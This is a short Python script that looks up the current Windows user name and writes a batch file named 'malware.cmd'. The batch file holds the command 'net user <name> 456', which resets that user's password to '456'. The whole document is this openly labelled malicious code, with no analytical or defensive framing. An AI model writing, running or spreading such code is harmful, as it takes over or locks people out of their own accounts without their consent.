import os
user = os.getlogin()
command = f"net user {user} 456"

open("malware.cmd","w").write(command)
